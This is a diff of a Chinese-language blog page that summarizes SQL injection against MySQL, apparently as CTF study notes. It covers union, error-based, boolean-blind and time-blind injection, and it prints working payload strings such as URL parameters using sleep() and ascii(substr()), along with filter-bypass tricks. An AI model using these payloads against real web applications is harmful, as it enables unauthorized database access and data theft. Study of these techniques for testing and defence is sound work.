@@ -1,162 +1,236 @@
-
-
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#FFF">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-
-<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
-  <meta http-equiv="Cache-Control" content="no-transform">
-  <meta http-equiv="Cache-Control" content="no-siteapp">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
 
 
-<link rel="alternate" type="application/rss+xml" title="Hexo" href="http://wscyoulin.github.io/rss.xml" />
-<link rel="alternate" type="application/atom+xml" title="Hexo" href="http://wscyoulin.github.io/atom.xml" />
-<link rel="alternate" type="application/json" title="Hexo" href="http://wscyoulin.github.io/feed.json" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/css/main.css">
 
-<link rel="stylesheet" href="/css/app.css?v=0.2.5">
 
-  
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"wscyoulin.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，password…  SQL语句 如果要查询users表中名字为wangwu的所有数据，SQL语句的写法应该是：select * fro">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入总结">
+<meta property="og:url" content="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，password…  SQL语句 如果要查询users表中名字为wangwu的所有数据，SQL语句的写法应该是：select * fro">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125015639.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125020538.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125134724360.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135338074.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135615732.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125140619905.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141503997.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141659099.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141723203.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150329630.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150311603.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152213745.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152223306.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152229281.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152257829.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152447135.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152453749.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152500665.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152527857.png">
+<meta property="article:published_time" content="2022-11-24T17:57:43.000Z">
+<meta property="article:modified_time" content="2022-11-25T07:30:05.702Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125015639.png">
+
 
 <link rel="canonical" href="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
 
 
 
-  <title>
-sql注入总结 |
-youlin = Hexo</title>
-<meta name="generator" content="Hexo 6.0.0"></head>
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div id="loading">
-    <div class="cat">
-      <div class="body"></div>
-      <div class="head">
-        <div class="face"></div>
-      </div>
-      <div class="foot">
-        <div class="tummy-end"></div>
-        <div class="bottom"></div>
-        <div class="legs left"></div>
-        <div class="legs right"></div>
-      </div>
-      <div class="paw">
-        <div class="hands left"></div>
-        <div class="hands right"></div>
-      </div>
-    </div>
-  </div>
-  <div id="container">
-    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="inner">
-        <div id="brand">
-          <div class="pjax">
-          
-  <h1 itemprop="name headline">sql注入总结
-  </h1>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/","path":"2022/11/25/sql注入总结/","title":"sql注入总结"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>sql注入总结 | Hexo</title>
   
-<div class="meta">
-  <span class="item" title="Created: 2022-11-25 01:57:43">
-    <span class="icon">
-      <i class="ic i-calendar"></i>
-    </span>
-    <span class="text">Posted on</span>
-    <time itemprop="dateCreated datePublished" datetime="2022-11-25T01:57:43+08:00">2022-11-25</time>
-  </span>
-</div>
 
 
-          </div>
-        </div>
-        <nav id="nav">
-  <div class="inner">
-    <div class="toggle">
-      <div class="lines" aria-label="Toggle navigation bar">
-        <span class="line"></span>
-        <span class="line"></span>
-        <span class="line"></span>
-      </div>
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
     </div>
-    <ul class="menu">
-      <li class="item title"><a href="/" rel="start">youlin</a></li>
-    </ul>
-    <ul class="right">
-      <li class="item theme">
-        <i class="ic i-sun"></i>
-      </li>
-      <li class="item search">
-        <i class="ic i-search"></i>
-      </li>
-    </ul>
   </div>
-</nav>
 
-      </div>
-      <div id="imgs" class="pjax">
-        <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipetv6p75j20zk0m8x6p.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicis3attqj20zk0m8k7l.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclh5u05ej20zk0m87df.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeyvx1d4j20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li>
-        </ul>
-      </div>
-    </header>
-    <div id="waves">
-      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
-        <defs>
-          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
-        </defs>
-        <g class="parallax">
-          <use xlink:href="#gentle-wave" x="48" y="0" />
-          <use xlink:href="#gentle-wave" x="48" y="3" />
-          <use xlink:href="#gentle-wave" x="48" y="5" />
-          <use xlink:href="#gentle-wave" x="48" y="7" />
-        </g>
-      </svg>
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
     </div>
-    <main>
-      <div class="inner">
-        <div id="main" class="pjax">
-          
-  <div class="article wrap">
-    
-<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
-<i class="ic i-home"></i>
-<span><a href="/">Home</a></span>
+  </div>
 </div>
 
-    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
-  <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
 
-  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="image" content="/images/avatar.jpg">
-    <meta itemprop="name" content="John Doe">
-    <meta itemprop="description" content=", ">
-  </span>
 
-  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="Hexo">
-  </span>
 
-  <div class="body md" itemprop="articleBody">
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text">注入分类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="nav-number">1.1.</span> <span class="nav-text">联合查询注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">报错注入</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">2.</span> <span class="nav-text">绕过技巧</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
     
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
 
-    <p>下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，password…</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125015639.png"></p>
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://wscyoulin.github.io/2022/11/25/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          sql注入总结
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-11-25 01:57:43 / Modified: 15:30:05" itemprop="dateCreated datePublished" datetime="2022-11-25T01:57:43+08:00">2022-11-25</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>下边以mysql为例：localhost为数据库的服务器，其中demo，information_schema，mysql等为数据库，在demo数据库下又含有demo，student，users表。如图展示的是users表中的内容，他有7个列，分别为id，name，password…</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125015639.png"></p>
 <p><strong>SQL语句</strong></p>
 <p>如果要查询users表中名字为wangwu的所有数据，SQL语句的写法应该是：select * from users where name=’wangwu’;</p>
 <p>select代表查询，*代表所有数据，from后代表查询的表，where代表查询条件。</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125020538.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/20221125020538.png"></p>
 <p>sql查询交互流程：</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125134724360.png" alt="image-20221125134724360"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125134724360.png" alt="image-20221125134724360"></p>
 <p>sql注入原理：</p>
 <p>   select * from users where name=’wangwu’; fjwaijfiwajfwafjawh </p>
 <p>1.SQL命令可查询、插入、更新、删除等，命令的串接。而以分号字符为不同命令的区别。</p>
@@ -201,7 +275,7 @@ youlin = Hexo</title>
 <p>6、获取数据</p>
 <p><strong>判断select查询的列数</strong></p>
 <p>判断select查询的列数的原因：union用于合并两个或多个select语句的结果集，但需要左右两侧列数一致</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135338074.png" alt="image-20221125135338074"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135338074.png" alt="image-20221125135338074"></p>
 <p><strong>判断select查询的列数的方法</strong></p>
 <p>1.order by + 列数</p>
 <p>当猜测的列数 小于等于 真实查询列数时，页面返回正常；反之，页面不正常</p>
@@ -214,7 +288,7 @@ youlin = Hexo</title>
 <p><strong>获取数据库名称方式</strong></p>
 <p>1、select database() //获取当前数据库的名称</p>
 <p>2、select schema_name from information_schema.schemata</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135615732.png" alt="image-20221125135615732"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125135615732.png" alt="image-20221125135615732"></p>
 <p>information_schema数据库是mysql自带的，它提供了访问数据库元数据的方式。什么是元数据呢？元数 据是关于数据的数据，如数据库名或表名或列名，列的数据类型，或访问权限等。因此，可以利用 informati_schema数据库获取我们想要的信息</p>
 <h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p><strong>报错注入原理</strong></p>
 <p>由于页面提供了mysql错误信息，黑客通过sql注入可以让mysql错误信息连同数据一并显示到页面上。</p>
@@ -225,27 +299,27 @@ youlin = Hexo</title>
 <p><strong>XML语法报错</strong></p>
 <p>相关函数：updatexml()、extractvalue()，mysql 5.1.5及以上，最多获取32个字符</p>
 <p>报错原因：xpath_expr中出现非xpath语法的字符</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125140619905.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125140619905.png"></p>
 <p>UpdateXML(xml_target, xpath_expr, new_xml)</p>
 <p>返回替换的XML片段</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141503997.png" alt="image-20221125141503997"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141503997.png" alt="image-20221125141503997"></p>
 <p>ExtractValue(xml_frag, xpath_expr)</p>
 <p>使用XPath表示法从XML字符串中提取值</p>
 <p><strong>数值溢出报错——大整数</strong></p>
 <p>mysql 5.5.5以上，5.5.50以下。一次最多获取32个字符</p>
 <p>试着对最大数做加法运算，可以看到报错的具体情况</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141659099.png" alt="image-20221125141659099"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141659099.png" alt="image-20221125141659099"></p>
 <p>在mysql中，要使用这么大的数，并不需要输入这么长的数字进去，使用按位取反运算运算即可</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141723203.png" alt="image-20221125141723203"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125141723203.png" alt="image-20221125141723203"></p>
 <p>我们知道，如果一个查询成功返回，则其返回值为0，进行逻辑非运算后可得1，这个值是可以进行数学运算</p>
 <p>的。利用这一特性，再结合之前说的溢出报错，就可以进行注入了。</p>
 <p>(select (!x-~0) from (select user()x)a)</p>
 <p><strong>数值溢出报错——浮点数</strong></p>
 <p>同理，浮点数也是存在一定范围的</p>
 <p>利用姿势：</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150329630.png" alt="image-20221125150329630"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150329630.png" alt="image-20221125150329630"></p>
 <p>select exp(~(select*from(select user())x));</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150311603.png" alt="image-20221125150311603"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125150311603.png" alt="image-20221125150311603"></p>
 <p><strong>group by报错——一步步学习原理</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select rand();//生成一个0~1的随机数</span><br><span class="line">select floor(rand());//将生成的随机数向下取整，值为固定的0  select floor(rand()*2);//将随机数乘2后再向下取整，值为0或1</span><br><span class="line">select concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2)) from information_schema.tables</span><br><span class="line">where table_schema=database();//这样的格式方便观察，当前数据库中有多少个表就会显示多少条数据</span><br><span class="line">select concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))zz from information_schema.tables</span><br><span class="line">where table_schema=database() group by zz;//进行分组，分为两组：0和1</span><br><span class="line">select count(*),concat(0x3a,0x3a,database(),0x3a,0x3a,floor(rand()*2))zz from  information_schema.tables where table_schema=database() group by zz;//计数，由于rand()的不确 定性，有时会报错，有时不会报错（不报错概率更大）</span><br></pre></td></tr></table></figure>
 
@@ -254,7 +328,7 @@ youlin = Hexo</title>
 <p>Floor(rand()*2);没有随机因子的序列是随机的 Floor(rand(0)*2);得到的序列是固定的 0011101110…</p>
 <p><strong>Ascii码表简单理解</strong></p>
 <p>在计算机中，我们每一个字符都对应这一个ascii码，在mysql中我们可以把未知的字符转换成ascii码，然后来进行比较确定其值。</p>
-<p><span class="exturl" data-url="aHR0cHM6Ly9iYWlrZS5iYWlkdS5jb20vaXRlbS9BU0NJSS8zMDkyOTY/ZnJvbXRpdGxlPWFzY2lpJUU3JUEwJTgxJmFtcDtmcm9taWQ9OTkwNzcmYW1wO2ZyPWFsYWRkaW4=">https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin</span></p>
+<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin">https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&amp;fromid=99077&amp;fr=aladdin</a></p>
 <p><strong>布尔盲注原理</strong></p>
 <p>之所以称之为布尔盲注，一方面是我们不能得到数据的具体内容，只能单个字符的进行猜测判断；另一方面 根据数据查询返回的页面结果（查询成功与失败页面不同）来判断我们输入的查询语句是否有效，非真即假， 所以称为布尔盲注。</p>
 <p>每个字符的判断是将该字符与ascii码的可见字符进行比较，相等时才能得到一个字符。Ascii码表可见字符有</p>
@@ -263,14 +337,14 @@ youlin = Hexo</title>
 <p>substr()、mid() 截取字符串 ascii() 将字符转换为ASCII码 concat() 字符串拼接</p>
 <p><strong>函数说明</strong></p>
 <p>SUBSTR(str,pos,len) //截取字符串，从第pos位开始，长度为len</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152213745.png" alt="image-20221125152213745"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152213745.png" alt="image-20221125152213745"></p>
 <p>ASCII(str) //将字符转换为ASCII码，若传入字符串，则只转换首字符</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152223306.png" alt="image-20221125152223306"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152223306.png" alt="image-20221125152223306"></p>
 <p>CONCAT(str1,str2,…) //将多个字符串拼接起来</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152229281.png" alt="image-20221125152229281"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152229281.png" alt="image-20221125152229281"></p>
 <p><strong>布尔盲注payload</strong></p>
 <p>select ascii(substr(concat(‘abc’,’def’),4,1)); //将abc与def字符串拼接到一起后得到第四个字符的ascii码</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152257829.png" alt="image-20221125152257829"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152257829.png" alt="image-20221125152257829"></p>
 <p>?id=1’ and ascii(substr(database(),1,1))=99 %23//若数据库名首字符ASCII为99，则页面正常显示</p>
 <p><strong>payload举例</strong></p>
 <p>拿到数据库名第一个字符的payload</p>
@@ -286,15 +360,15 @@ youlin = Hexo</title>
 <p>之所以称之为延时盲注，一方面是我们不能得到数据的具体内容，只能单个字符的进行猜测判断；另一方面 根据数据查询返回的时间（查询成功数据库休眠n秒，失败则不休眠）来判断我们输入的查询语句是否有效， 所以称为延时盲注。</p>
 <p><strong>相关函数</strong></p>
 <p>sleep() //数据库休眠指定时间函数</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152447135.png" alt="image-20221125152447135"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152447135.png" alt="image-20221125152447135"></p>
 <p>benchmark() //重复执行表达式一定次数达到页面返回延时 if(condition,true_statement,false_statement) //依据表达式的真假执行不同的语句</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152453749.png" alt="image-20221125152453749"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152453749.png" alt="image-20221125152453749"></p>
 <p>if(condition,true_statement,false_statement)//若表达式为真，执行true_statement ；表达式为假， false_statement</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152500665.png" alt="image-20221125152500665"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152500665.png" alt="image-20221125152500665"></p>
 <p><strong>延时盲注payload</strong></p>
 <p>select if(ascii(substr(concat(‘abc’,’def’),4,1))=100,sleep(3),null); //若拼接字符串的第四个字符的ascii码</p>
 <p>值为100，数据库休眠3秒，否则不做任何操作</p>
-<p><img data-src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152527857.png" alt="image-20221125152527857"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wscyoulin/blogimage@main/img/image-20221125152527857.png" alt="image-20221125152527857"></p>
 <p>?id=1’ and if(ascii(substr(database(),1,1))=117,sleep(3),null) %23 //若数据库名第一个字符的ASCII值是 99，则页面休眠3秒</p>
 <p><strong>payload举例</strong></p>
 <p>拿到数据库名第一个字符的payload</p>
@@ -307,7 +381,7 @@ youlin = Hexo</title>
 <p>拿到数据第四个字符的payload</p>
 <p>?id=1’and if(ascii(substr((select flag from flags limit 0,1),4,1))=103,sleep(1),null) and ‘1’=’1</p>
 <h2 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h2><p>十六进制、ASCII码绕过引号 char</p>
-<p><span class="exturl" data-url="aHR0cDovL3Rvb2xzLmJ1Z3NjYW5lci5jb20vdGV4dC96aWZ1Y2h1YW56aHVhbmhleC5odG1s">http://tools.bugscaner.com/text/zifuchuanzhuanhex.html</span></p>
+<p><a target="_blank" rel="noopener" href="http://tools.bugscaner.com/text/zifuchuanzhuanhex.html">http://tools.bugscaner.com/text/zifuchuanzhuanhex.html</a></p>
 <p>like、in、regex绕过等号：substr(password,1,1) like(‘p’); substr(password,1,1) in(‘p’);</p>
 <p>逗号被过滤：select * from (select 1)a join (select 2)b、substr(password from 1 for 1) </p>
 <p>空格被过滤：/**/、%0d %0a %0c %0b %a0 %09、+</p>
@@ -318,320 +392,70 @@ youlin = Hexo</title>
 <p>sleep() 《 == 》 benchmark()； </p>
 <p>mid()、substr()《==》substring()</p>
 
-  </div>
+    </div>
 
-   <footer>
+    
+    
+    
 
-    <div class="meta">
-  <span class="item">
-    <span class="icon">
-      <i class="ic i-calendar-check"></i>
-    </span>
-    <span class="text">Edited on</span>
-    <time title="Modified: 2022-11-25 15:30:05" itemprop="dateModified" datetime="2022-11-25T15:30:05+08:00">2022-11-25</time>
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/11/19/buu-web/" rel="prev" title="buu_web（21-xx)">
+                  <i class="fa fa-chevron-left"></i> buu_web（21-xx)
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/11/29/unlink%E5%A4%8D%E4%B9%A0/" rel="next" title="unlink复习">
+                  unlink复习 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
